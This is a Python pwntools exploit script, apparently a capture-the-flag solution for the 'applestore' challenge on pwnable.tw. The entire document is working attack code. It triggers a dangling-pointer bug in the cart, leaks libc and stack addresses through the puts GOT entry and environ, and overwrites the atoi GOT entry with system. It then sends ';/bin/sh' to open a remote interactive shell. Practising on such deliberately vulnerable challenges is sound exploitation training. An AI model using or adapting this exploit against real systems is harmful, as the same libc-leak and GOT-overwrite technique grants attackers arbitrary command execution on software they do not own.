from pwn import *

def add (num):
    r.recvuntil(b'> ')
    r.sendline(str(2))
    r.recvuntil(b'Number> ')
    r.sendline(str(num))

def checkout ():
    r.recvuntil(b'> ')
    r.sendline(str(5))
    r.recvuntil('(y/n) > ')
    r.sendline('y')

def cart (payload):
    r.recvuntil('> ')
    r.sendline('4')
    r.recvuntil('(y/n) > ')
    r.sendline(payload)

def dels (index):
    r.recvuntil(b'> ')
    r.sendline(str(3))
    r.recvuntil('Item Number> ')
    r.sendline(index)

#r = process('./applestore')
r = remote('chall.pwnable.tw', 10104)
e, l = ELF('./libc_32.so.6'), ELF('./applestore')

for i in range (6):
    add(1)
for i in range (20):
    add(2)

# Leak libc base
checkout()
cart(b'y\x00' + p32(l.got['puts']) + b'\0' * 0xc)
r.recvuntil('27: ')
libc = u32(r.recv(4)) - e.symbols['puts']
system = libc + e.symbols['system']
environ = libc + e.symbols['environ']
success('libc base -> %s' % hex(libc))
success('system address -> %s' % hex(system))
success('environ address -> %s' % hex(environ))

# Leak Stack address
cart(b'y\x00' + p32(environ) + b'\0' * 0xc)
r.recvuntil('27: ')
stack = u32(r.recv(4))
del_stack = stack - 0x104
success('del ebp -> %s' % hex(del_stack))

# Overwrite atoi got and call system
payload = b'27' + p32(0) + p32(0) + p32(l.got['atoi'] + 0x22) + p32(del_stack-0x8)
dels(payload)
r.sendlineafter(b'> ', p32(system) + b';/bin/sh\x00')

r.interactive()
